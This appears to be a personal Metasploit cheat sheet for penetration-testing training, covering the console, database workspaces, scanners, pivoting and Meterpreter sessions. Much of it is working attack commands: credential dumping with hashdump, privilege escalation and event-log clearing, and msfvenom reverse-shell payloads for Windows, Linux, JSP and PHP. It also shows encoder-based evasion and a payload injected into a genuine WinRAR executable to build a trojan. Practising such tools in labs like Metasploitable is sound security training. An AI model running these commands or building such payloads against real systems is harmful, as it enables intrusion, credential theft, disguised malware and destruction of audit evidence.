# The Metasploit Framework (MSF)

> Status: ✅ Reference complete
> Date started: 2026-10-27
> Date finished: 2026-10-27

## 1. Goal
Drive the full MSF workflow — console, DB/workspaces, search/use/exploit, Meterpreter, DB-backed enum, vuln scanning, and payload generation with msfvenom. Placeholders: `<TARGET_IP>`, `<LOCAL_HOST_IP>`, `<LOCAL_PORT>`, `<MODULE_NAME>`.

## Setup & console
```bash
sudo apt update && sudo apt install metasploit-framework -y
sudo systemctl enable postgresql ; sudo systemctl restart postgresql ; sudo msfdb init
service postgresql start && msfconsole -q
# in console:
db_status ; help ; version
show all | show exploits | show payloads
search <STRING> ; search cve:2017 type:exploit platform:windows
use <MODULE_NAME> ; show options ; set <OPTION> <value> ; run   # run = exploit = execute
```

## Sessions
```text
sessions                       # list
sessions 1                     # interact
sessions -n <name> -i 1        # rename
sessions -C sysinfo -i 1       # run a meterpreter cmd
sessions -k 1 | -K             # kill one / all
sessions -u 1                  # upgrade shell → meterpreter
```

## Workspaces & DB
```text
sudo service postgresql start ; msfconsole ; db_status    # "Connected to msf"
msfdb reinit                                   # fix a broken DB
workspace                                      # list
workspace -a <NEW> ; workspace <NAME>          # create / switch
workspace -r <OLD> <NEW> ; workspace -d <NAME> ; workspace default
# import external nmap (must be -oX XML) / scan from inside MSF
db_import <scan.xml>                           # "Successfully imported" ; if no hosts → check XML/perms
db_nmap -Pn -sV -O <TARGET_IP>                 # auto-saved to DB
hosts ; services ; vulns ; loot ; creds ; notes
db_export -f xml backup.xml
```

## Querying & reusing DB data
```text
hosts -c address,os_name -S Windows            # columns + search filter
services -p 22,80,443                          # by port
services -s http -c port,info                  # by service name
services -S "Apache" -c host,port,info         # search banner
services -u                                    # unknown services
hosts -o /tmp/hosts.csv ; services -o /tmp/services.csv    # export CSV
# feed discovered hosts straight into a scanner:
services -s http --rhosts -o /tmp/web.txt
use auxiliary/scanner/http/http_version ; set RHOSTS file:/tmp/web.txt ; run
services -s ssh --rhosts                       # set RHOSTS from DB web/ssh hosts inline
```

## Meterpreter
```text
background ; sysinfo ; getuid ; getprivs ; getsystem
ps ; pgrep explorer ; migrate <PID>
cat / cd / ls / pwd / mkdir / rmdir / edit / search -f *.txt
download <file> /root/  ;  upload /local/exploit.exe C:\\Windows
getenv PATH ; ifconfig ; idletime ; checksum md5 /bin/bash ; clearev
hashdump ; shell ; execute -f ifconfig ; resource <file.txt>
```

## Auxiliary scanners (non-exploit; no payload; results → DB; can run through a pivot)
```text
search portscan
# port scan variants:
use auxiliary/scanner/portscan/tcp            # set RHOSTS / PORTS 1-10000 / THREADS (1 per host)
#   options: CONCURRENCY (ports/host), DELAY, JITTER, TIMEOUT (ms)
use auxiliary/scanner/portscan/syn            # stealth half-open ; set THREADS 20
use auxiliary/scanner/portscan/ack            # firewall rule mapping
use auxiliary/scanner/portscan/xmas
use auxiliary/scanner/discovery/udp_sweep     # set RHOSTS ; BATCHSIZE
# service scanners
use auxiliary/scanner/ftp/{ftp_version,ftp_login,anonymous}
use auxiliary/scanner/smb/{smb_enumusers,smb_enumshares,smb_login}
use auxiliary/scanner/http/{dir_scanner,http_version,http_header,robots_txt,http_login,http_put}
use auxiliary/scanner/mysql/{mysql_version,mysql_login,mysql_hashdump,mysql_schemadump}
use auxiliary/scanner/ssh/{ssh_version,ssh_login,ssh_enumusers}
use auxiliary/scanner/smtp/{smtp_version,smtp_enum}
```

## Pivoting — scan an internal subnet through a session
```text
# from a Meterpreter session on a dual-homed host:
meterpreter > run post/windows/gather/arp_scanner RHOSTS 10.10.10.0/24   # discover internal hosts
meterpreter > background
route add 10.10.10.0/24 1                      # route that subnet via session 1
route print
use auxiliary/scanner/portscan/tcp             # now reaches the internal net
set RHOSTS 10.10.10.3 ; set PORTS 21,22,80,443,3389 ; set THREADS 5 ; run
```
Auxiliary scanners run over the route, so you map the internal network without any external tool touching it. (Fuller pivoting — `autoroute`, `portfwd`, socks — is in module 09.)

## Vulnerability scanning in MSF
```text
db_nmap -sS -sV -O <TARGET_IP>
search type:exploit name:iis ; search <SERVICE_VERSION>
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
# db_autopwn plugin
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
load db_autopwn ; db_autopwn -p -t ; db_autopwn -p -t -PI 445
analyze ; vulns ; vulns -p 445
# Nessus import
db_import /path/scan.nessus ; hosts ; services ; vulns -p 445
# WMAP web scanner
load wmap ; wmap_sites -a <TARGET_IP> ; wmap_targets -t <URL> ; wmap_run -e ; wmap_vulns -l
```

## Payloads — msfvenom
```bash
msfvenom --list payloads|formats|encoders
# Windows
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > p86.exe
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > p64.exe
# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > p86
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > p64
# encoded (shikata_ga_nai), -i = iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f exe > enc.exe
# inject into a real PE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32.exe > winrar.exe
# web payloads
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f raw > shell.jsp      # Tomcat
msfvenom -p php/meterpreter_reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f raw > shell.php
```

### Staged vs non-staged + handler automation
```text
# staged:     windows/x64/meterpreter/reverse_tcp
# non-staged: windows/x64/meterpreter_reverse_https
use multi/handler ; set payload <MSFVENOM_PAYLOAD> ; set LHOST ... ; set LPORT ... ; run
# handler.rc automation:
# (file) use multi/handler / set payload windows/meterpreter/reverse_tcp / set LHOST / set LPORT / run
msfconsole -q -r handler.rc            # or inside: resource handler.rc
makerc out.rc                           # export typed commands to a resource script
```

> Default start: `service postgresql start && msfconsole -q` → `db_status` → `setg RHOSTS/RHOST` → `workspace -a <svc>` → `db_nmap -sS -sV -O` → for every exploit check `options`/`info`, set, `run`. Upgrade shells with `sessions -u`.
>
> Practice labs: **Metasploitable 3** (`git clone rapid7/metasploitable3` → `./build.sh windows2008|ubuntu1404`, needs Vagrant+VirtualBox), **Metasploitable 2**, **VulnHub Kioptrix Level 1** — scan → import → exploit end to end.
